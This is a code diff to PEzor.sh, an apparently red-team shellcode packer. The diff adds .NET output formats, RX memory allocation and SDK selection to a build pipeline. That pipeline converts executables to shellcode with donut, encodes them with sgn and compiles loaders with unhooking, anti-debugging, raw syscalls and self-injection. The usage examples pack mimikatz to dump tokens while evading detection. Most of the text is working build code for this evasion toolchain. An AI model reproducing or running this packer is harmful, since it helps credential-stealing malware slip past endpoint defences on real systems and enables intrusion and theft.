@@ -28,6 +28,8 @@ UNHOOK=false
 ANTIDEBUG=false
 TEXT=false
 SELF=false
+RX=false
+SDK=4.5
 CC=x86_64-w64-mingw32-clang
 CXX=x86_64-w64-mingw32-clang++
 OUTPUT_FORMAT=exe
@@ -52,14 +54,18 @@ OPTIONS
   -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
   -sgn                      Encode the generated shellcode with sgn
   -text                     Store shellcode in .text section instead of .data
-  -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]
+  -rx                       Allocate RX memory for shellcode
+  -self                     Execute the shellcode in the same thread
+  -sdk=VERSION              Use specified .NET Framework version (2, 4, 4.5 (default))
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
-  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll)
+  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
   [donut args...]           After the executable to pack, you can pass additional Donut args, such as -z 2
 
 EXAMPLES
-  # 64-bit (self-inject)
+  # 64-bit (self-inject RWX)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/x64/mimikatz.exe -z 2
+  # 64-bit (self-inject RX)
+  $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2
   # 64-bit (raw syscalls)
   $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz/x64/mimikatz.exe -z 2
   # 64-bit (reflective dll)
@@ -68,6 +74,10 @@ EXAMPLES
   $ PEzor.sh -format=service-exe mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (service dll)
   $ PEzor.sh -format=service-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  # 64-bit (dotnet)
+  $ PEzor.sh -format=dotnet -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  # 64-bit (dotnet-pinvoke)
+  $ PEzor.sh -format=dotnet-pinvoke -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 32-bit (self-inject)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
   # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
@@ -87,9 +97,10 @@ OPTIONS
   -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
   -sgn                      Encode the provided shellcode with sgn
   -text                     Store shellcode in .text section instead of .data
+  -rx                       Allocate RX memory for shellcode
   -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
-  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll)
+  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
 
 EXAMPLES
   # 64-bit (self-inject)
@@ -150,7 +161,6 @@ do
         -self)
             SELF=true
             echo "[?] Self-executing payload"
-            echo "[*] Warning: -self requires -text and supports RX shellcode only"
             ;;
         -antidebug)
             ANTIDEBUG=true
@@ -172,9 +182,18 @@ do
             echo '[?] Final shellcode will be encoded with sgn'
             SGN=true
             ;;
+        -rx)
+            echo '[?] Allocating RX memory for execution'
+            echo "[*] Warning: -rx supports RX shellcode only"
+            RX=true
+            ;;
         -format=*)
             OUTPUT_FORMAT="${arg#*=}"
             echo "[?] Output format: $OUTPUT_FORMAT"
+            ;;
+        -sdk=*)
+            SDK="${arg#*=}"
+            echo "[?] .NET SDK: $SDK"
             ;;
         *)
             echo "[?] Processing $arg"
@@ -197,12 +216,12 @@ if [ $BITS -eq 32 ] && [ $SYSCALLS = true ]; then
     exit 1
 fi
 
-if [ $SELF = true ] && [ $SYSCALLS = true ]; then
-    echo '[x] Error: cannot execute raw syscalls when self-executing the payload'
-    exit 1
-fi
+# if [ $SELF = true ] && [ $SYSCALLS = true ]; then
+#     echo '[x] Error: cannot execute raw syscalls when self-executing the payload'
+#     exit 1
+# fi
 
-if [ $SELF = true ] && [ $SGN = true ]; then
+if [ $RX = true ] && [ $SGN = true ]; then
     echo '[x] Error: cannot encode the shellcode when self-executing the payload'
     exit 1
 fi
@@ -215,46 +234,7 @@ else
     file $BLOB
 fi
 
-rm -f $TMP_DIR/{shellcode,sleep}.cpp{,donut} $TMP_DIR/{ApiSetMap,loader}.o $TMP_DIR/*.ll
-
-echo "unsigned int sleep_time = $SLEEP;" > $TMP_DIR/sleep.cpp
-
-if [ $IS_SHELLCODE = false ] && [ $SGN = false ]; then
-    echo '[?] Executing donut' &&
-    #(donut $BLOB -f 3 -o $TMP_DIR/shellcode.cpp.donut $@ || exit 1) &&
-    (donut $BLOB -f 3 -o $TMP_DIR/shellcode.cpp.donut "$@" || exit 1) &&
-    echo '#pragma clang diagnostic ignored "-Woverlength-strings"' >> $TMP_DIR/shellcode.cpp &&
-    if [ $TEXT = true ]; then echo '__attribute__((section (".text")))' >> $TMP_DIR/shellcode.cpp; fi &&
-    cat $TMP_DIR/shellcode.cpp.donut >> $TMP_DIR/shellcode.cpp &&
-    echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1
-elif [ $IS_SHELLCODE = true ] && [ $SGN = false ]; then
-    echo '#pragma clang diagnostic ignored "-Woverlength-strings"' >> $TMP_DIR/shellcode.cpp &&
-    if [ $TEXT = true ]; then echo '__attribute__((section (".text")))' >> $TMP_DIR/shellcode.cpp; fi &&
-    echo -n 'unsigned char buf[] = "' >> $TMP_DIR/shellcode.cpp &&
-    od -vtx1 $BLOB | sed -e 's/^[0-9]* //' -e '$d' -e 's/^/ /' -e 's/ /\\x/g' | tr -d '\n' >> $TMP_DIR/shellcode.cpp &&
-    echo '";' >> $TMP_DIR/shellcode.cpp &&
-    echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1
-elif [ $IS_SHELLCODE = true ] && [ $SGN = true ]; then
-    echo '[?] Executing sgn' &&
-    (sgn -a $BITS -c 1 -o $TMP_DIR/shellcode.bin $BLOB || exit 1) &&
-    echo '#pragma clang diagnostic ignored "-Woverlength-strings"' >> $TMP_DIR/shellcode.cpp &&
-    if [ $TEXT = true ]; then echo '__attribute__((section (".text")))' >> $TMP_DIR/shellcode.cpp; fi &&
-    echo -n 'unsigned char buf[] = "' >> $TMP_DIR/shellcode.cpp &&
-    od -vtx1 $TMP_DIR/shellcode.bin | sed -e 's/^[0-9]* //' -e '$d' -e 's/^/ /' -e 's/ /\\x/g' | tr -d '\n' >> $TMP_DIR/shellcode.cpp &&
-    echo '";' >> $TMP_DIR/shellcode.cpp &&
-    echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1
-elif [ $IS_SHELLCODE = false ] && [ $SGN = true ]; then
-    echo '[?] Executing donut' &&
-    (donut $BLOB -o $TMP_DIR/shellcode.bin.donut "$@" || exit 1) &&
-    echo '[?] Executing sgn' &&
-    (sgn -a $BITS -c 1 -o $TMP_DIR/shellcode.bin $TMP_DIR/shellcode.bin.donut || exit 1) &&
-    echo '#pragma clang diagnostic ignored "-Woverlength-strings"' >> $TMP_DIR/shellcode.cpp &&
-    if [ $TEXT = true ]; then echo '__attribute__((section (".text")))' >> $TMP_DIR/shellcode.cpp; fi &&
-    echo -n 'unsigned char buf[] = "' >> $TMP_DIR/shellcode.cpp &&
-    od -vtx1 $TMP_DIR/shellcode.bin | sed -e 's/^[0-9]* //' -e '$d' -e 's/^/ /' -e 's/ /\\x/g' | tr -d '\n' >> $TMP_DIR/shellcode.cpp &&
-    echo '";' >> $TMP_DIR/shellcode.cpp &&
-    echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1
-fi
+rm -f $TMP_DIR/{shellcode,sleep}.cpp{,donut} $TMP_DIR/{ApiSetMap,loader}.o $TMP_DIR/Global.cs
 
 case $OUTPUT_FORMAT in
     exe)
@@ -277,73 +257,189 @@ case $OUTPUT_FORMAT in
         echo '[?] Building service shared library'
         OUTPUT_EXTENSION=service.dll
         ;;
+    dotnet*)
+        echo '[?] Building .NET executable'
+        OUTPUT_EXTENSION=dotnet.exe
+        ;;
 esac
 
-CCFLAGS="-O3 -Wl,-strip-all -Wall -pedantic"
-CPPFLAGS="-O3 -Wl,-strip-all -Wall -pedantic"
-CXXFLAGS="-std=c++17 -static"
+case $OUTPUT_FORMAT in
+    exe | dll | reflective-dll | service-exe | service-dll)
+        echo "unsigned int sleep_time = $SLEEP;" > $TMP_DIR/sleep.cpp
+        if [ $IS_SHELLCODE = false ] && [ $SGN = false ]; then
+            echo '[?] Executing donut' &&
+            (donut $BLOB -f 3 -o $TMP_DIR/shellcode.cpp.donut "$@" || exit 1) &&
+            echo '#pragma clang diagnostic ignored "-Woverlength-strings"' >> $TMP_DIR/shellcode.cpp &&
+            if [ $TEXT = true ]; then echo '__attribute__((section (".text")))' >> $TMP_DIR/shellcode.cpp; fi &&
+            cat $TMP_DIR/shellcode.cpp.donut >> $TMP_DIR/shellcode.cpp &&
+            echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1
+        else
+            if [ $IS_SHELLCODE = false ]; then
+                echo '[?] Executing donut' &&
+                (donut $BLOB -o $TMP_DIR/shellcode.bin.donut "$@" || exit 1)
+            else
+                cp $BLOB $TMP_DIR/shellcode.bin.donut
+            fi
 
-if [ $BITS -eq 32 ]; then
-    CC=i686-w64-mingw32-clang
-    CXX=i686-w64-mingw32-clang++
-    CCFLAGS="$CCFLAGS -m32 -DWIN_X86"
-    CPPFLAGS="$CPPFLAGS -m32 -DWIN_X86"
-else
-    CCFLAGS="$CCFLAGS -D_WIN64 -DWIN_X64"
-    CPPFLAGS="$CPPFLAGS -D_WINX64 -DWIN_X64"
-fi
+            if [ $SGN = true ]; then
+                echo '[?] Executing sgn' &&
+                (sgn -a $BITS -c 1 -o $TMP_DIR/shellcode.bin $TMP_DIR/shellcode.bin.donut || exit 1)
+            else
+                cp $TMP_DIR/shellcode.bin.donut $TMP_DIR/shellcode.bin
+            fi
 
-if [ $DEBUG = true ]; then
-    CCFLAGS="$CCFLAGS -D_DEBUG_"
-    CPPFLAGS="$CPPFLAGS -D_DEBUG_"
-fi
+            echo '#pragma clang diagnostic ignored "-Woverlength-strings"' >> $TMP_DIR/shellcode.cpp &&
+            if [ $TEXT = true ]; then echo '__attribute__((section (".text")))' >> $TMP_DIR/shellcode.cpp; fi &&
+            echo -n 'unsigned char buf[] = "' >> $TMP_DIR/shellcode.cpp &&
+            od -vtx1 $TMP_DIR/shellcode.bin | sed -e 's/^[0-9]* //' -e '$d' -e 's/^/ /' -e 's/ /\\x/g' | tr -d '\n' >> $TMP_DIR/shellcode.cpp &&
+            echo '";' >> $TMP_DIR/shellcode.cpp &&
+            echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1
+        fi
 
-if [ $SYSCALLS = true ]; then
-    CCFLAGS="$CCFLAGS -DSYSCALLS"
-    CPPFLAGS="$CPPFLAGS -DSYSCALLS"
-fi
+        CCFLAGS="-O3 -Wl,-strip-all -Wall -pedantic"
+        CPPFLAGS="-O3 -Wl,-strip-all -Wall -pedantic"
+        CXXFLAGS="-std=c++17 -static"
 
-if [ $UNHOOK = true ]; then
-    CCFLAGS="$CCFLAGS -DUNHOOK"
-    CPPFLAGS="$CPPFLAGS -DUNHOOK"
-fi
+        if [ $BITS -eq 32 ]; then
+            CC=i686-w64-mingw32-clang
+            CXX=i686-w64-mingw32-clang++
+            CCFLAGS="$CCFLAGS -m32 -DWIN_X86"
+            CPPFLAGS="$CPPFLAGS -m32 -DWIN_X86"
+        else
+            CCFLAGS="$CCFLAGS -D_WIN64 -DWIN_X64"
+            CPPFLAGS="$CPPFLAGS -D_WINX64 -DWIN_X64"
+        fi
 
-if [ $ANTIDEBUG = true ]; then
-    CCFLAGS="$CCFLAGS -DANTIDEBUG"
-    CPPFLAGS="$CPPFLAGS -DANTIDEBUG"
-fi
+        if [ $DEBUG = true ]; then
+            CCFLAGS="$CCFLAGS -D_DEBUG_"
+            CPPFLAGS="$CPPFLAGS -D_DEBUG_"
+        fi
 
-if [ $SELF = true ]; then
-    CCFLAGS="$CCFLAGS -DSELFINJECT"
-    CPPFLAGS="$CPPFLAGS -DSELFINJECT"
-fi
+        if [ $SYSCALLS = true ]; then
+            CCFLAGS="$CCFLAGS -DSYSCALLS"
+            CPPFLAGS="$CPPFLAGS -DSYSCALLS"
+        fi
 
-if [ $OUTPUT_FORMAT = "dll" ]; then
-    CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT"
-    CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT"
-elif [ $OUTPUT_FORMAT = "reflective-dll" ]; then
-    CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
-    CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
-elif [ $OUTPUT_FORMAT = "service-exe" ]; then
-    CCFLAGS="$CCFLAGS -DSERVICE_EXE"
-    CPPFLAGS="$CPPFLAGS -DSERVICE_EXE"
-elif [ $OUTPUT_FORMAT = "service-dll" ]; then
-    CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT -DSERVICE_EXE -DSERVICE_DLL "
-    CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT -DSERVICE_EXE -DSERVICE_DLL"
-fi
+        if [ $UNHOOK = true ]; then
+            CCFLAGS="$CCFLAGS -DUNHOOK"
+            CPPFLAGS="$CPPFLAGS -DUNHOOK"
+        fi
 
-if [ $OUTPUT_FORMAT = "reflective-dll" ]; then
-    $CC $CCFLAGS -c $INSTALL_DIR/ReflectiveDLLInjection/dll/src/ReflectiveLoader.c -o $TMP_DIR/ReflectiveLoader.o
-    SOURCES="$SOURCES $TMP_DIR/ReflectiveLoader.o"
-fi
+        if [ $ANTIDEBUG = true ]; then
+            CCFLAGS="$CCFLAGS -DANTIDEBUG"
+            CPPFLAGS="$CPPFLAGS -DANTIDEBUG"
+        fi
 
-if [ $UNHOOK = true ]; then
-    $CC $CCFLAGS -c $INSTALL_DIR/ApiSetMap.c -o $TMP_DIR/ApiSetMap.o &&
-    $CC $CCFLAGS -c $INSTALL_DIR/loader.c -o $TMP_DIR/loader.o
-    SOURCES="$SOURCES $TMP_DIR/ApiSetMap.o $TMP_DIR/loader.o"
-fi
+        if [ $SELF = true ]; then
+            CCFLAGS="$CCFLAGS -DSELFINJECT"
+            CPPFLAGS="$CPPFLAGS -DSELFINJECT"
+        fi
 
-$CXX $CPPFLAGS $CXXFLAGS $INSTALL_DIR/*.cpp $TMP_DIR/{shellcode,sleep}.cpp $SOURCES -o $CURRENT_DIR/${BLOB%%.exe}.packed.$OUTPUT_EXTENSION &&
-strip $CURRENT_DIR/${BLOB%%.exe}.packed.$OUTPUT_EXTENSION || exit 1
+        if [ $RX = true ]; then
+            CCFLAGS="$CCFLAGS -DRX"
+            CPPFLAGS="$CPPFLAGS -DRX"
+        fi
+
+        if [ $TEXT = true ]; then
+            CCFLAGS="$CCFLAGS -D_TEXT_"
+            CPPFLAGS="$CPPFLAGS -D_TEXT_"
+        fi
+
+        if [ $OUTPUT_FORMAT = "dll" ]; then
+            CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT"
+            CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT"
+        elif [ $OUTPUT_FORMAT = "reflective-dll" ]; then
+            CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
+            CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
+        elif [ $OUTPUT_FORMAT = "service-exe" ]; then
+            CCFLAGS="$CCFLAGS -DSERVICE_EXE"
+            CPPFLAGS="$CPPFLAGS -DSERVICE_EXE"
+        elif [ $OUTPUT_FORMAT = "service-dll" ]; then
+            CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT -DSERVICE_EXE -DSERVICE_DLL "
+            CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT -DSERVICE_EXE -DSERVICE_DLL"
+        fi
+
+        if [ $OUTPUT_FORMAT = "reflective-dll" ]; then
+            $CC $CCFLAGS -c $INSTALL_DIR/ReflectiveDLLInjection/dll/src/ReflectiveLoader.c -o $TMP_DIR/ReflectiveLoader.o
+            SOURCES="$SOURCES $TMP_DIR/ReflectiveLoader.o"
+        fi
+
+        if [ $UNHOOK = true ]; then
+            $CC $CCFLAGS -c $INSTALL_DIR/ApiSetMap.c -o $TMP_DIR/ApiSetMap.o &&
+            $CC $CCFLAGS -c $INSTALL_DIR/loader.c -o $TMP_DIR/loader.o
+            SOURCES="$SOURCES $TMP_DIR/ApiSetMap.o $TMP_DIR/loader.o"
+        fi
+
+        $CXX $CPPFLAGS $CXXFLAGS $INSTALL_DIR/*.cpp $TMP_DIR/{shellcode,sleep}.cpp $SOURCES -o $CURRENT_DIR/${BLOB%%.exe}.packed.$OUTPUT_EXTENSION &&
+        strip $CURRENT_DIR/${BLOB%%.exe}.packed.$OUTPUT_EXTENSION || exit 1
+        ;;
+    dotnet*)
+        echo 'public static class Global {' >> $TMP_DIR/Global.cs &&
+        echo "public static int sleep_time = $SLEEP;" >> $TMP_DIR/Global.cs &&
+        echo -n 'public static ' >> $TMP_DIR/Global.cs
+        if [ $IS_SHELLCODE = false ] && [ $SGN = false ]; then
+            echo '[?] Executing donut' &&
+            (donut $BLOB -f 7 -o $TMP_DIR/shellcode.cs "$@" || exit 1) &&
+            cat $TMP_DIR/shellcode.cs >> $TMP_DIR/Global.cs
+        else
+            if [ $IS_SHELLCODE = false ]; then
+                echo '[?] Executing donut' &&
+                (donut $BLOB -o $TMP_DIR/shellcode.bin.donut "$@" || exit 1)
+            else
+                cp $BLOB $TMP_DIR/shellcode.bin.donut
+            fi
+
+            if [ $SGN = true ]; then
+                echo '[?] Executing sgn' &&
+                (sgn -a $BITS -c 1 -o $TMP_DIR/shellcode.bin $TMP_DIR/shellcode.bin.donut || exit 1)
+            else
+                cp $TMP_DIR/shellcode.bin.donut $TMP_DIR/shellcode.bin
+            fi
+
+            echo -n 'byte[] my_buf = {' >> $TMP_DIR/Global.cs &&
+            od -vtx1 $TMP_DIR/shellcode.bin | sed -e 's/^[0-9]* //' -e '$d' -e 's/^/ /' -e 's/ /,0x/g' -e 's/^,//g' | sed -z -e 's/\n/,/g' -e 's/,$//g' >> $TMP_DIR/Global.cs &&
+            echo -n '};' >> $TMP_DIR/Global.cs
+        fi
+        echo '}' >> $TMP_DIR/Global.cs
+        DOTNET_FLAGS="-unsafe -debug-"
+
+        if [ ! $SDK = "4.5" ]; then
+            DOTNET_FLAGS="$DOTNET_FLAGS -sdk:$SDK"
+        fi
+
+        if [ $BITS -eq 32 ]; then
+            DOTNET_FLAGS="$DOTNET_FLAGS -platform:x86"
+        else
+            DOTNET_FLAGS="$DOTNET_FLAGS -platform:x64"
+        fi
+
+        if [ $DEBUG = true ]; then
+            DOTNET_FLAGS="$DOTNET_FLAGS -define:_DEBUG_"
+        fi
+
+        if [ $SELF = true ]; then
+            DOTNET_FLAGS="$DOTNET_FLAGS -define:SELFINJECT"
+        fi
+
+        if [ $RX = true ]; then
+            DOTNET_FLAGS="$DOTNET_FLAGS -define:RX"
+        fi
+
+        case $OUTPUT_FORMAT in
+        dotnet)
+            mcs $DOTNET_FLAGS -out:$CURRENT_DIR/${BLOB%%.exe}.packed.$OUTPUT_EXTENSION $INSTALL_DIR/dotnet/*.cs $TMP_DIR/Global.cs
+            ;;
+        dotnet-pinvoke)
+            DOTNET_FLAGS="$DOTNET_FLAGS -define:PINVOKE"
+            mcs $DOTNET_FLAGS -out:$CURRENT_DIR/${BLOB%%.exe}.packed.$OUTPUT_EXTENSION $INSTALL_DIR/dotnet/Program.cs $TMP_DIR/Global.cs
+            ;;
+        dotnet-createsection)
+            DOTNET_FLAGS="$DOTNET_FLAGS -define:MAPVIEWOFSECTION"
+            mcs $DOTNET_FLAGS -out:$CURRENT_DIR/${BLOB%%.exe}.packed.$OUTPUT_EXTENSION $INSTALL_DIR/dotnet/*.cs $TMP_DIR/Global.cs
+            ;;
+        esac
+
+        ;;
+esac
 
 echo -n '[!] Done! Check '; file $CURRENT_DIR/${BLOB%%.exe}.packed.$OUTPUT_EXTENSION
